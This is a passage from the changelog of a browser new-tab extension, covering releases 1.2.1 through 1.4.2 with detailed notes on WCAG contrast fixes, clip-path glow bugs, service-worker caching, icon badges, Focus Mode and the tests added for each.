It is a `#app-shell::after` with `z-index: -1`, not an extra background
layer, and that choice is load-bearing. **Three** code paths assign the
wallpaper as an inline style — `themes.js applyWallpaper()`,
`WallpaperManager._applyWallpaper()`, and its custom-image branch — and
every one of them would wipe a background-layer scrim. A negative
z-index child paints above its parent's background and below its in-flow
content, so this sits over the wallpaper, under the entire UI, and is
untouchable by inline writes. Verified by calling `applyWallpaper()` and
simulating a custom image: the scrim survives both.

That also means it covers **custom user wallpapers**, which are the
brightest risk of all and which no artwork fix could have reached.

Disabled in light mode, which paints its own already-measured surface.

### Fixed

| element | before | after |
|---|---|---|
| app label | 1.14:1 | **5.27:1** |
| idle page tab | 1.24:1 | **8.50:1** |
| search placeholder | 2.65:1 | **4.73:1** |
| greeting line | 7.94:1 | 11.61:1 |
| date line | 6.80:1 | 11.45:1 |

The idle page tab needed two further changes: even behind the scrim,
`--text` at 10.5px reached only 2.94:1, so idle tabs use `--text-bright`
and the tab strip's tint deepened from `--lg-tint-pill` (0.50) to 0.72.
Both are overridden in light mode.

### Verified

- All 10 measured elements pass in **both** themes.
- App labels clear AA on all eight wallpapers (4.99:1 on Rose, the
  tightest; 5.27:1 on emerald).
- Light theme re-measured after the change: 10/10, scrim confirmed
  `display: none`, tab-strip tint confirmed overridden.

### Trade-off

The wallpapers read moodier and less vivid than before — that is the
accepted cost of the approach, chosen over darkening the artwork (which
would not have covered custom wallpapers) or accepting halo-only
readability.

### Tests

1944 (+6). The guard pins the scrim's existence, its `z-index: -1`,
`pointer-events: none`, an alpha within [0.5, 0.7], and its light-mode
opt-out. One test asserts `themes.js` still writes an inline background —
so if that ever stops being true, the note explaining why a pseudo-element
was necessary gets re-examined rather than silently rotting.
Mutation-tested: weakening the scrim to 0.30 fails the alpha guard.

---

## [1.4.2] — 2026-08-04

Dark mode had never been contrast-measured the way light mode was in
1.4.1. Measuring it properly — against the wallpaper's actual pixels —
found more than the one faint placeholder that prompted this.

### Method

Dark mode's backdrop is a photograph, so there is no flat surface to
measure against. The shipped wallpapers are same-origin, so they can be
decoded into a canvas and sampled directly: map each element's rect
through `background-size: cover` into image space, read **every** pixel
under it, and take the brightest one — the worst case for light text.
Element backgrounds are then composited on top of that pixel.

Two sampling mistakes were made and corrected along the way, both of
which had produced falsely reassuring numbers:

- A coarse grid (7×7) **misses small bright specular regions**. The idle
  page tab read 3.82:1 on a grid and 1.22:1 per-pixel. Exhaustive
  sampling is also cheaper — one `getImageData` per element instead of 49.
- Sampling the brightest pixel under a *container* overstates the worst
  case for a small label inside it. The tab strip's brightest pixel is
  near-white, but a given label may sit nowhere near it. Elements are now
  measured over their own rect, and the placeholder over its measured
  glyph run rather than the full 620px pill.

### Fixed

- **The greeting hero sat directly on the wallpaper.** Sampling all eight
  shipped wallpapers under the date line, `--text` failed AA on six of
  them — as low as 1.74:1 on Crimson — and even `--text-bright` failed on
  Crimson at 3.34:1. No text colour can carry text over an arbitrary
  photo, so the hero gained a soft radial scrim (0.34 at centre, fading
  to transparent) and the date line moved to `--text-bright`. Date line
  2.64:1 → **6.80:1**, greeting line 5.72:1 → **7.94:1**. The scrim is
  disabled in light mode, where the surface is already known.

- **The search pill was 4% opaque.** `backdrop-filter: blur()` blurs the
  wallpaper but preserves its luminance, so a bright region stayed bright
  and the placeholder vanished into it at 1.1:1. The fill now has a dark
  base under the accent tint, and the placeholder alpha went 0.35 → 0.72.
  Now 2.54:1 — much better, still short of AA (see below).

- **Idle page tabs had no halo.** App, dock and folder labels have all
  along used a dark 1px stroke with `paint-order: stroke` to stay legible
  over photos; the tab labels never got it. They now use the same
  established treatment rather than a new mechanism. Disabled in light
  mode, where it would only smudge.

### Known limitation — not fixed, needs a design decision

Three elements still fail formal AA in dark mode: app labels (1.12:1),
idle page tabs (1.24:1) and the search placeholder (2.54:1). All three
fail at the same place — the emerald wallpaper has a near-white glow
(`rgb(249,255,205)`) sitting directly behind the app grid and search bar.

This is not something colour can solve. Those elements are *perceptually*
readable because of their stroke halos, but WCAG's contrast formula has
no mechanism to credit a halo, so they cannot be made to pass by tuning
text colour or glass opacity — the fill would have to become effectively
opaque, which is no longer glass.

The real options are to darken the shipped wallpapers, add a global scrim
over the wallpaper layer, or accept halo-based readability. All three
change how the default theme looks, so none was taken unilaterally.

### Light theme

Re-measured after these changes: 10 of 10 elements still pass, and the
hero scrim is confirmed `display: none` there.

---

## [1.4.1] — 2026-08-03

Light theme was unusable on the home screen, and had been for a long
time. Apps and Focus Mode were fine, which is why it survived.

### Fixed

- **The dark wallpaper covered the light theme entirely.** `#app-shell`
  is full-bleed at `z-index: 1` with `background-image:
  url(wallpapers/emerald.webp)` hardcoded in `main.css`, and there was no
  light-mode counterpart. So light mode's `--bg` never showed: the dark
  photo stayed put while the light text tokens (`--text-bright` `#1d1d1f`)
  applied on top of it. Greeting, clock, app labels, page tabs and folder
  pills were all but invisible. Reproduced on defaults with no wallpaper
  set.

  Light mode now renders a surface instead of shipping eight light
  wallpapers. Contrast becomes deterministic — no photo can guarantee
  4.5:1 across every region a label might land on — and it adds no bytes
  to an offline-first extension.

  The `!important` on that rule is load-bearing rather than lazy:
  `themes.js applyWallpaper()` writes the wallpaper as an **inline**
  style for every non-default color theme, and `WallpaperManager` does
  the same for custom images. An important author declaration is the only
  thing in the cascade that outranks a normal inline one. A plain CSS
  override would have fixed the default theme and silently lost for
  anyone on Sapphire, Rose or a custom image.

  Trade-off, deliberate: the chosen wallpaper is not shown in light mode.
  It returns untouched in dark, which is the default.

  That this was the intended design all along is written into the
  codebase — `glass.css`'s light label rule opens with *"In light theme
  the wallpaper goes light"*, and the light greeting rules already swap
  their dark halos for light ones. Only the wallpaper override was ever
  missing.

- **`--text` had no contrast headroom in light mode.** `#6e6e73` (Apple's
  secondary label, which assumes pure white beneath) measured 4.66:1 on a
  perfectly flat `--bg` and dropped under 4.5:1 over *any* tint at all —
  4.09:1 on the darkest part of the new surface, failing AA for the date
  line and idle page tabs. Now `#5d5d63`: 5.28:1 there, 6.01:1 flat,
  6.54:1 on white cards, and still clearly between `--text-bright` and
  `--text-dim`.

- **Accent-as-text failed AA at small sizes.** Light mode's system blue
  `#007AFF` is 3.24:1 on the surface, so the greeting line (11px) and the
  active page tab (10.5px) both failed. New `--accent-text` token —
  `#0058bf`, 5.38:1 — used only where accent is *text*. Rims, fills and
  glows keep system blue. In dark mode `--accent-text` aliases `--accent`,
  so every switched call site is a literal no-op.

- **The Ko-fi "Support" badge was invisible in light mode**, at 1.08:1 —
  it hardcoded `rgba(200, 220, 240, …)`, which is exactly dark mode's
  `--ui-text-rgb`. Swapping the five occurrences to
  `rgba(var(--ui-text-rgb), …)` fixes the hue in light and changes
  nothing in dark, since that token already flips per theme. A light-only
  alpha bump (0.65 → 0.85) takes it to 5.71:1, matching the dark badge's
  5.72:1.

- **The search placeholder was 2.37:1** in light mode. It is this field's
  only label, so it is real text and owes 4.5:1; alpha 0.45 → 0.75 gives
  5.07:1. The dark rule has the same weakness and is deliberately left
  alone — dark is the default and out of scope here.

- **`.greeting-sec` re-declared `-webkit-text-fill-color: var(--accent)`
  after its `color`**, which silently overrides `color` on every WebKit
  engine. The seconds now take `--accent-text` in both declarations;
  without the second one the first was inert.

### Verified

Every element named above was measured, not eyeballed: text colour
composited through its own background chain down onto the **darkest pixel
the surface can produce** (bottom of the linear ramp plus the nearer
accent radial), with transitions suppressed. All 13 clear WCAG AA — 4.5:1
for normal text, 3:1 for large.

Three measurement traps were worth the trouble:

- `getComputedStyle` returns *interpolated mid-transition* values, so
  anything with a `color` transition reads as its previous colour right
  after a theme switch. Suppress transitions first.
- Suppressing **animations** too is wrong here: `greetFadeDown` uses
  `fill-mode: both`, and killing it drops the Ko-fi badge back to its
  declared `opacity: 0.32`. That cost one round of "fixing" an opacity
  that was never broken.
- The clock is `background-clip: text`, so a naive backdrop walk compares
  its gradient against itself and reports exactly 1.00:1.

### Dark theme

Unchanged, and asserted rather than assumed: wallpaper still
`emerald.webp`, `--accent-text` resolves to `#00e5c1`, `--text` to
`#8a9bb0`, and the Ko-fi text, border, ornament and placeholder all
resolve to their original literals.

### Tests

1938 (+13). `tests/light-theme-contrast.test.js` pins the combination
that failed — a token block in `tokens.css` and a background in
`main.css`, each individually fine. It asserts the light `#app-shell`
override exists, is `!important`, and does not reintroduce a wallpaper;
that the light text tokens clear AA against the computed worst-case
surface; that the hierarchy stays ordered; and that dark's
`--accent-text` still aliases `--accent`.

One test asserts `--accent` alone would **fail** AA, so that anyone
"simplifying" `--accent-text` away finds out why it exists. Both guards
were mutation-tested: reverting `--text` to `#6e6e73` fails the AA test,
and deleting the shell override fails three.

---

## [1.4.0] — 2026-08-03

The desktop learns to tell you something before you click. App icons now
carry live badges — and the badge path turns out to have been dead since
v1.0.

### Added — icon badges

`SmartIcon` has emitted a `.smart-badge` element since v1.0 whenever
`metadata.badge` was set. Nothing ever set it, and **no stylesheet ever
styled it**, so even a populated badge would have rendered as an unstyled
div. Both halves are now real.

| Icon | Badge | Source |
|---|---|---|
| Todo | red count pill, capped at `99+` | undone tasks across every mission |
| Pomodoro | pulsing teal dot | a session actively counting down |
| Clock | amber dot | at least one armed alarm |

Counts where the number is the message, dots where the state is. A count
of alarms would be noise — that *an* alarm is set is the whole point;
conversely a dot on Todo would hide the difference between one task and
thirty.

### How it is wired

Not by threading a `badge` field through the four places that construct a
`SmartIcon`. That would mean re-rendering icons on every data change,
which fights the grid's drag state, and it would have missed the dock and
folder overlay unless all four were kept in sync forever.

Instead `BadgeManager` paints onto whatever `.hex-icon[data-app-id]`
elements are in the document. Grid, dock and folder overlay get badges
without knowing badges exist — verified by switching page tabs and
opening/closing a folder overlay and confirming the badges survive.

Two triggers: storage subscriptions on the three source keys, and a
`MutationObserver` for re-rendered icons. The store only emits when
content actually changed, so a per-second Pomodoro `TICK` that changes
nothing costs nothing.

The painter writes badge nodes into the tree it observes, which is a
self-trigger loop waiting to happen. Every host carries a
`dataset.badgeSig` and painting is skipped when the signature is
unchanged, so a settled tree produces no mutations. Confirmed by watching
badge node add/remove counts for 3 idle seconds: **0 and 0**.

### Placement

The badge is a direct child of `.hex-icon`, which is deliberately the one
layer of the icon carrying no mask — the hexagon mask lives on
`.hex-icon::before`, `::after` and `.hex-icon-content`. Putting the badge
inside the content wrapper instead would have sliced it along the hexagon
edge, the same class of bug as v1.2.2 / v1.2.3. Verified rather than
assumed: the host reports `mask: none`, `clip-path: none`,
`overflow: visible`, and the badge overhangs the corner by 2px.

### Fixed

- **The status pill went stale on every todo change.** It refreshed only
  on alarm events and tab-visibility changes, so completing a task left
  it showing the old count until you switched tabs and back. Harmless
  while it was the only counter on screen — but a live icon badge now
  sits centimetres away, and "0 badge / 2 tasks" reads as a broken app.
  It subscribes to the same keys the badges do; verified moving in
  lockstep 2 → 1 → cleared.

- **The count pill failed WCAG AA in light mode**, at 3.55:1 (white on
  `--danger` `#ff3b30`). At 10px bold this is not "large text", so 4.5:1
  applies. Fixed by deepening the red rather than dimming the text —
  white on `#d70015` is 5.38:1, and dark ink on the brighter dark-mode
  red is 5.74:1.

  The two themes genuinely need opposite foregrounds, so this is a new
  `--badge-alert-bg` / `--badge-alert-fg` token pair rather than a
  hardcoded hex in `badges.css`. Both values were computed, not eyeballed.

### Changed

- **`countOpenTodos` / `countActiveAlarms` now have one definition**, in
  `badges/badgeModel.js`. `StatusBar` had its own copies; the pill and the
  icon badge reading from separate counters is precisely how the v1.1.1
  TodoWidget bug happened, and this time the two would have been rendered
  side by side.
- Badges hide entirely under `body.focus-active` — Focus Mode collapses
  the desktop, so badges must not outlive it.

### Tests

1925 (+26). `tests/badge-model.test.js` covers the counters against
hostile input (all three source blobs are user-editable by JSON import and
two are sync-replicated, and a badge that throws takes the icon paint down
with it): holes in the mission array, malformed tasks, a missing `done`
flag, non-finite counts.

Also covered: the cap at `99+`, that a paused timer does **not** read as
running, that an empty object does not read as running merely because its
phase isn't `'idle'`, and that `badgeSignature` is stable for equal
descriptors — that last one is load-bearing for correctness, not speed,
since an unstable signature would make the painter retrigger its own
observer forever.

### Known issue — not introduced here

Light theme is broken on the home screen: the body keeps its dark
background while light-mode text tokens apply, leaving the greeting,
clock, app labels and page tabs nearly unreadable. Apps and Focus Mode are
unaffected. Verified pre-existing by stashing all of the v1.3.0 and v1.4.0
work and reproducing on a clean tree with no wallpaper set. Tracked
separately; the dark default is unaffected.

### Service worker

Cache bumped to `yancotab-v1.4.0-badges`. Precache gains `css/badges.css`,
`badgeModel.js` and `BadgeManager.js`.

---

## [1.3.0] — 2026-08-03

Five releases of audits, so: a feature. **Focus Mode** — the last
surviving idea from the ORBIT concept in the production plan's design
fight, and the only Phase 4 item that never got built.

### Added — Focus Mode

Collapses the desktop to three things: the clock, one task, and the
Pomodoro ring. Grid, dock, search, widgets, folders, status bar and the
cosmic stage decorations all go away.

- **Entry:** `> focus` in SmartSearch, or **Ctrl+Shift+F**. Shift is
  required — plain Ctrl+F is the browser's find bar, which an extension
  has no business shadowing.
- **Exit:** Escape, or the exit button. Escape is two-stage: while the
  task input has focus it only blurs, so the key that dismisses a typo
  isn't also the key that tears down the screen.
- **Keyboard:** Space start/pause, ←/→ (and ↑/↓) change task, Enter
  completes.
- **The task** comes from the active Todo mission. Choosing one *pins*
  it, but a pin is honoured only while that task is still open — complete
  it in the Todo app or the Today widget and Focus Mode moves on rather
  than leaving you staring at something already finished. With no open
  tasks the card becomes an input, and what you type is created and
  pinned in one step.
- **Persists across reloads.** This is deliberate, not an oversight: a
  new tab opens dozens of times a day, and one opened mid-session should
  reinforce the session rather than drop you into a grid of games. It is
  skipped while onboarding is up, so a first run never starts occluded.

### Notes on ownership

Focus Mode reimplements neither system it renders.

- Timer transitions dispatch the same intents through
  `pomodoro/engine/reducer.js` that PomodoroApp uses. Three surfaces now
  tick (app, widget, focus); each re-reads storage before applying
  `TICK`, so whichever fires first advances the phase and the others
  observe the advanced state — one transition, one toast.
- Task writes route through `todo/persistence.js`, so `streakLog` and
  `completedAt` stay consistent with TodoApp's own writes. Verified by
  asserting a streak entry actually appears after completing from the
  focus screen — this is the exact bug class that bit TodoWidget in
  1.1.1, where it wrote a v1 schema the app no longer read.
- `yancotab_focus_v1` is the only key Focus Mode owns, and it is
  **never synced**. "Am I focusing right now" is a property of this
  device in this moment; replicating it would drop a second machine into
  Focus Mode with a task pinned by an id that may not resolve there.

### Fixed

- **Toasts were invisible behind the overlay.** Caught while
  red-teaming, not by looking at the code: the first version sat at a
  hand-picked `z-index: 9000`, above the entire token scale — so every
  toast painted underneath it. Proven rather than argued, by firing a
  real toast and confirming `elementFromPoint` at its centre returned
  the overlay. That silently swallowed "focus complete · 5-min break",
  which is the one message a focus session exists to deliver.

  The fix isn't a bigger number on the toast: a new `--z-focus: 750`
  token slots the overlay into the documented stacking order — above
  search (700), below toast (800), onboarding (950) and the boot screen.

- **Two labels failed WCAG AA in light mode.** `.fm-date` and
  `.fm-elapsed` used `--text-dim`, which light mode resolves to
  `#aeaeb2` — measured at **2.03:1**. Both now use `--text` (4.66:1
  light, 6.94:1 dark). All twelve text/background pairs were measured
  across both themes and all pass.

  Measuring this needed care: `.fm-exit` reads `2.61:1` if you sample it
  right after switching themes, because it is the only element here with
  a `color` transition and `getComputedStyle` returns the interpolated
  mid-flight value. With transitions suppressed it settles at 4.66:1.
  The label fixes were real; that one was the measurement lying.

- **Tap targets were 26px and 28px.** The checkbox is the primary action
  on the screen. Both now carry a true 44×44 hit area via an unstyled
  `::before`, with the visual size unchanged. `inset` resolves against
  the *padding* box, so the borders make the required offsets −11px and
  −9px rather than the −9px/−8px that arithmetic on the border box
  suggests — verified by hit-testing the corners, and by completing a
  task with a tap outside the visible circle.

### Changed

- **`mobileShell.js` 976 → 924 lines.** The contract says a non-trivial
  edit to a file over the cap should extract a chunk rather than add to
  it, so the global keyboard shortcuts moved to a new
  `os/ui/shellShortcuts.js`. Net effect of this release on the worst
  offender in the codebase is −52 lines.
- Focus Mode's own DOM scaffold lives in `focus/focusView.js`, following
  the view-extraction pattern already used by Tarneeb, Trix and Todo.
  No file added here exceeds 130 lines.

### Tests

1899 (+40). `tests/focus-mode.test.js` covers the pure core: task
selection and pin-staleness, cycling (asserted in *both* directions —
an unknown current id plus a naive `idx + step` sends dir=-1 to the end
of the list instead of the top), MM:SS and elapsed formatting, phase
labels, and ring progress.

Hostile input is covered because all three blobs Focus Mode reads are
reachable by JSON import: `normalizeFocusState` rejects non-string and
empty task ids (a `0` id is falsy-but-truthy enough to suppress the
first-open fallback), non-finite timestamps, and drops unknown keys.
Ring progress is clamped at both ends — a backgrounded tab can tick long
past a deadline, and a progress above 1 would invert the dash offset and
draw the ring backwards.

### Service worker

Cache bumped to `yancotab-v1.3.0-focus-mode`. Precache gains
`css/focus.css` and the four new modules.

---

## [1.2.5] — 2026-07-29

Extended the audit to HTML and the config files. The markup itself was
clean; the references between files were not.

### Fixed

- **Offline mode was serving no CSS at all.** `sw.js` precaches
  `'./css/shell.css'`, but `index.html` requests
  `'./css/shell.css?v=<version>'`. `caches.match()` keys on the full URL
  including the query, so every one of the 15 stylesheets missed the cache
  and fell through to the network. The precache *looked* healthy — 349
  entries, every path verified to exist in 1.2.0 — while offline had no
  styling whatsoever.

  Fixed with `{ ignoreSearch: true }` on the cache-first branch only. Proven
  both ways against the real Cache API: precached as `/css/shell.css` and
  requested as `/css/shell.css?v=v1.2.4`, exact matching misses and
  `ignoreSearch` hits. The network-first API branch deliberately keeps exact
  matching — the same probe showed `ignoreSearch` there returns one
  latitude's weather for another's.

- **`index.html` had drifted four versions behind.** All 15 `?v=`
  cache-busting queries and the boot screen's subtitle still read `v1.1.2`
  while manifest, package.json, `os/version.js` and `sw.js` had moved to
  `v1.2.4`. `ASSET_VERSION` exists in `os/version.js` but nothing consumes
  it, and with no build step there is nothing to template these — so the
  release version actually lives in **seven** places, not the four the
  project contract names.

  Consequence: returning web-app users kept the v1.1.2 CSS out of their HTTP
  cache, so none of the v1.2.x visual work reached them, and the boot screen
  advertised the wrong version.

### Audited clean

No findings in the shipped HTML for: boolean attributes set to `"false"`
(the same trap fixed in `el()` last release), duplicate ids, dangling
`for` / `aria-labelledby` / `aria-describedby` / `aria-controls`
references, missing local `href`/`src` targets, or inline scripts and
`on*` handlers (which MV3's CSP kills silently). `manifest.json` icons,
the new-tab override, and every `__MSG_*__` placeholder all resolve.

### Tests

1859 (+30). `tests/asset-refs.test.js` covers version sync across all seven
locations, service-worker cache correctness (precached paths exist, the
static branch ignores the query, the API branch does not), manifest and
locale references, and the six HTML checks above — run per shipped page.

Which pages ship is read from `scripts/pack-extension.sh`'s own `EXCLUDES`
list rather than hardcoded, so the audit follows the packer. That parser
needed a fix of exactly the kind this file exists to catch: one exclude
comment reads "aren't part of the extension", and that lone apostrophe
desynchronised naive quote-pairing, silently shifting every entry after it
and pulling two dev-only pages into the audit.

Both new guards were verified to fail on mutation — reverting `?v=` to the
stale value and removing `ignoreSearch` each turn the suite red.

---

## [1.2.4] — 2026-07-29

Applied the v1.2.3 audit idea to the JS side — "code that looks like it
works and silently does nothing" — and found a live one: **every button in
the Mahjong sidebar was dead**, including New Game.

### Fixed

- **`el()` now handles HTML boolean attributes correctly.**
  `os/utils/dom.js` routed every non-`class`/`style`/`on*` prop through
  `setAttribute(key, value)`. Boolean attributes are presence-based, so
  `setAttribute('disabled', 'false')` **disables** the element — meaning
  `disabled: someCondition` broke in exactly the case it was guarding: the
  falsy one, where the control was supposed to be *enabled*.

  Confirmed live before fixing: all four Mahjong sidebar buttons
  (Undo / Hint / Shuffle / New Game) reported `.disabled === true`, three of
  them rendering `disabled="false"` with no `is-disabled` class — so they
  looked perfectly clickable and did nothing. There was no way to start a new
  game from the sidebar.

  Ten call sites were affected across Mahjong, Tarneeb, Trix, Tic-Tac-Toe and
  three PDF chrome modules. Fixed once in `el()` rather than ten times at the
  call sites: a truthy value sets the attribute to `""` (the spec's canonical
  form), and `false` / `null` / `undefined` / `""` remove it.

  The list is explicit rather than "drop every falsy value", because
  `aria-expanded="false"` is meaningful and must survive. Verified both ways.

  `disabled: 'disabled'` — the deliberate always-off spelling used for the
  Files placeholder tab and Pomodoro's "coming soon" Detach button — still
  reads as truthy and keeps working.

- **Non-function `on*` props are dropped instead of becoming attributes.**
  `onclick: cond ? null : fn` fell past the listener branch (which requires
  `typeof value === 'function'`) into `setAttribute`, writing a literal
  `onclick="null"`. MV3's CSP makes that inert, so it failed silently. No
  standard attribute begins with `on`, so there is nothing to fall through to.

### Tests

1829 (+9). `tests/el-props.test.js`:

- Unit tests for the new `el()` behaviour against a DOM stub — falsy boolean
  omitted, truthy applied as `""`, ARIA `false` preserved, non-boolean
  attributes untouched, non-function `on*` dropped, and the exact expressions
  from the shipped bug (`!!(!canUndo)`, `i === 0`, …) asserted both ways.
- A source scanner over `os/` that still flags the *other* silent-failure
  shapes `el()` cannot fix: DOM-only properties with no content attribute
  (`textContent`, `className`, `innerHTML`, `htmlFor`), `value` on a
  `<textarea>` (whose value comes from child text — already fixed once for
  the OCR panel in 1.0.0), and non-function `on*` values.
- As with the CSS guard, a companion test asserts the scanner still parses
  >200 `el()` call sites, so a broken parser fails loudly instead of passing
  vacuously. That guard earned its keep immediately: the first version of the
  scanner matched tag names against a comment/string-blanked copy of the
  source and parsed zero call sites.

### Verified

Smoke-launched all 22 apps after the change: 21 render with zero console
errors, and Minesweeper mounts its 1280×520 canvas as expected (it is a
canvas game). Mahjong specifically: Undo correctly disabled at game start,
Hint / Shuffle / New Game enabled, and clicking Shuffle reorders the board
while preserving all 144 tiles.

---

## [1.2.3] — 2026-07-29

Swept every stylesheet for the clip-path bug fixed in v1.2.2, and added a
test so it cannot come back. Found 15 more instances across 8 files —
including an invisible keyboard focus ring, which is an accessibility bug.

### Fixed

Written as a static analyser rather than a grep, because the broken
declaration almost never sits in the same rule as the `clip-path` — it is
usually a state variant (`.x.is-selected .y`) on an element clipped by its
base rule, which no amount of grepping for `clip-path` will surface.

| file | what was dead |
|---|---|
| `browser.css` | `.wh-legend-dot.is-anchor` glow; `.is-standard` border |
| `calculator.css` | `.calc-key.is-eq` drop shadow |
| `files-vault.css` | `.fv-cell.is-drop-target` ring **and** glow; `.fv-coin.is-selected`; `.fv-coin.is-pinned`; the `fv-drop-flash` keyframes |
| `pdf-codex.css` | `.cx-ol-dot` border; `.cx-ol-item.is-active` glow |
| `photos-lightbox.css` | `.lb-month.is-active` glow; **`.lb-cell:focus-visible` outline** |
| `pomodoro.css` | `.sol-pip-dot` border; `.sol-pip.is-active` glow |
| `table.css` | `.table-player-av` lift; `.table-player-turn` glow **and** ring |
| `todo.css` | `.mc-chk` border |

Three deserve calling out:

- **Keyboard focus was invisible on clipped controls.** An `outline` paints
  outside the border box, so the global `*:focus-visible` ring is deleted on
  any clipped element. `.lb-cell`, `.mc-chk`, `.wh-portal-hex` and
  `.cx-bm-dot` now carry an inset focus ring instead.
- **Dragging a file onto a folder showed nothing.** `.fv-cell.is-drop-target`
  set both a `0 0 0 2px` ring and a 30px glow; a spread-only shadow paints
  entirely outside the border box, so the clip removed both.
- **The Tarneeb/Trix whose-turn indicator was fully invisible** — its glow
  was a `filter: drop-shadow` on the clipped element itself (deleted), and
  its ring was an `::after` at `inset: -3px` *inside* the clipped host, so
  the part that reached past the hexagon was cut.

### Changed

Fixes use whichever of three shapes fits:

- **Inset the effect** — a border becomes `box-shadow: inset 0 0 0 1px`,
  which follows the hexagon instead of being sliced into fragments along the
  two vertical edges. Used for the plain borders and focus rings.
- **Unclipped host + clipped `::before`/`::after` surface** — the host keeps
  no clip so it can carry a real `filter: drop-shadow()`, and a pseudo
  element carries the hexagon fill via a `--*-bg` variable so state variants
  stay one-liners. Used for `.wh-legend-dot`, `.calc-key`, `.fv-cell`,
  `.fv-coin`, `.cx-ol-dot`, `.lb-month-pip`, `.sol-pip-dot`. Hosts with text
  content get `isolation: isolate` so the `z-index: -1` surface sits behind
  the text without escaping behind an ancestor.
- **Move the effect to an unclipped ancestor** — used for the table avatar,
  where both pseudo-elements were already taken.

`fv-drop-flash` now animates `filter` rather than `box-shadow`: the shadow
was invisible while the host was clipped and would have drawn a rectangle
once it wasn't.

### Tests

1820 (+2). `tests/clip-path-effects.test.js` fails on any clipped element
that declares an outer `box-shadow`, a `filter: drop-shadow()`, an
`outline`, or a `border`, and follows `animation-name` into `@keyframes`
(the `fv-drop-flash` bug lived there and a rule-level scan missed it).

It resolves `var()` before deciding whether a shadow layer is `inset` —
without that, every token-composed inset shadow such as
`box-shadow: var(--lg-edge)` reads as a false positive and the guard is
useless. A second test asserts the analyser still finds >20 clipped classes,
so a broken selector parser fails loudly instead of silently passing.

---

## [1.2.2] — 2026-07-29

Revives twelve glows and outlines that `clip-path` has been silently
deleting — including the Notes star selection ring, which meant selecting
or dragging a star produced no visual feedback at all.

### Fixed

The v1.2.1 notes flagged three dead glows. Auditing properly found twelve,
because the first pass only inspected rules that *declare* `clip-path` — it
missed the state variants that set a shadow on an element clipped by its
base rule.

**Notes stars** (`.nc-star-core`): base, `.is-anchor`, `.is-idea`,
`.is-draft`, `.is-selected`, `.is-dragging`.
**Browser portals** (`.wh-portal-hex`): base, `.is-anchor`, `.is-dragging`,
`.is-merge-target`, `.is-floating`, `.is-recent`.
**Notes timeline** (`.nc-tl-marker`).

Three of these were worse than merely invisible:

- `.is-selected` / `.is-dragging` stars set `0 0 0 2px` selection rings. A
  spread-only shadow paints entirely outside the border box, so the clip
  removed it — selecting or dragging a star showed nothing.
- `.is-anchor` / `.is-merge-target` portals used `border: 1px/1.5px solid`.
  A border sits *inside* the border box, so the clip kept only the
  fragments running along the two vertical edges, drawing a broken outline
  rather than none.
- `.is-recent`'s pulse was an `::after` at `inset: -4px` *inside* the
  clipped hex. Children of a clipped element are clipped too, so the 4px it
  reached past the hexagon was cut, and `z-index: -1` hid the remainder
  behind the hex's own near-opaque background.

### How

Not fixable in place, and this was verified rather than assumed — each
option was rasterised through an SVG `foreignObject` and the pixels read:

| technique | glow outside the shape |
|---|---|
| `clip-path` + `box-shadow` | none (the original bug) |
| `clip-path` + `filter: drop-shadow()` on the **same** element | **none** — the filter is applied before the clip, so the clip eats it too |
| `filter: drop-shadow()` on an **unclipped ancestor** | works |

The ancestor-filter route was still wrong here: `.wh-portal` and `.nc-star`
also contain a favicon and a text label, which would have glowed too. So
each glow became its own unclipped layer on the parent — a `::before` aura
and a `::after` outline, both absolutely positioned, so neither adds
layout. Auras are radial rather than hexagonal: at these blur radii the two
are indistinguishable, and it avoids maintaining a second mask asset. The
outlines *are* hexagonal (a slightly larger clipped hexagon behind the
core, so the 1–2px that peeks out reads as a rim).

Parameterised via custom properties (`--aura-blur`, `--aura-rgb`,
`--aura-a`, `--ring-w`, `--ring-o`), all derived from the core's size, so
each of the twelve variants is one or two lines and `.is-anchor` can resize
the core without the aura drifting. `.is-done` now dims its aura too —
otherwise a completed star blazed as brightly as an open one.

Falloff was tuned against measured pixels rather than by eye; stops run to
100% of `closest-side` so the glow reaches the full blur distance (an
earlier attempt died at 74%, ~14px short on the portal).

### Notes

- Every dead `box-shadow` on the three clipped elements was removed rather
  than left in place. A declaration that looks functional but cannot render
  is how this bug survived in the first place.
- `.is-floating` keeps a white haze rather than the accent, so a detached
  portal still reads as detached.

---

## [1.2.1] — 2026-07-29

Carries the rounded-hex corners from the home screen into the app
interiors, so the whole extension matches instead of just the new-tab
surface.

### Changed

- **`--hex-clip` now resolves to a rounded clipPath** instead of
  `polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%)`. That one
  token change rounds all 42 in-app hex decorations across 13 stylesheets —
  browser portals, files vault cells, notes markers, PDF outline dots,
  photo lightbox cells, pomodoro pips, settings badges, todo icons, table
  avatars, tic-tac-toe bezels, calculator keys.
- **40 literal `polygon(...)` copies replaced with `var(--hex-clip)`**, and
  the four `var(--hex-clip, polygon(...))` fallbacks in `maps.css`
  collapsed. The shape now has exactly one definition
  (`HEX_PATH_D` in `os/ui/icons/hexGeometry.js`) feeding three consumers:
  the `--hex-mask` token, the SVG rim stroke, and this clipPath.

### Why a clip and not the mask

An audit of all 42 rules before converting found two things that ruled out
reusing `--hex-mask` here:

- **Six sites are interactive** — `.calc-key`, `.fv-cell`, `.lb-cell`,
  `.mc-chk`, `.wh-portal-hex`, `.cx-bm-dot`. `clip-path` clips hit-testing;
  `mask` does not. Swapping them would have silently grown each click
  target from the hexagon to its full square bounding box, which for a
  calculator keypad or a packed photo grid means squares that can overlap
  their neighbours and steal clicks.
- **Three sites have outer glows that `clip-path` is silently discarding** —
  `.wh-portal-hex` (`0 0 24px`), `.nc-star-core` (`0 0 18px`),
  `.nc-tl-marker` (`0 0 10px`). Same latent bug the home tiles had. Left
  as-is deliberately: unclipping them is a visual change to Notes and the
  Browser that belongs in its own pass, not smuggled into a corner-radius
  change. Noted here so it isn't lost.

`clipPathUnits="objectBoundingBox"` is what makes one definition fit every
element size — `clip-path: path()` cannot, being fixed pixels. The 0..100
path is reused verbatim with `transform="scale(0.01)"`.

`os/boot.js` now calls `ensureHexDefs()` before first paint. This is
load-bearing: an invalid `clip-path: url()` reference computes to `none`
rather than erroring, so a missing `<defs>` would render every in-app hex
as a plain square with nothing in the console.

### Tests

1818 total (+5). New coverage in `tests/hex-geometry.test.js`:

- `--hex-clip` points at the clipPath rather than a polygon.
- **No stylesheet reintroduces the sharp hexagon.** Scans all of `css/`
  with block-comment stripping (line-based stripping reported tokens.css's
  own documentation of the old value as an offender). Verified to fail with
  an exact `file:line` when a sharp polygon is added back, and to pass once
  removed.
- `boot.js` imports and calls `ensureHexDefs`.
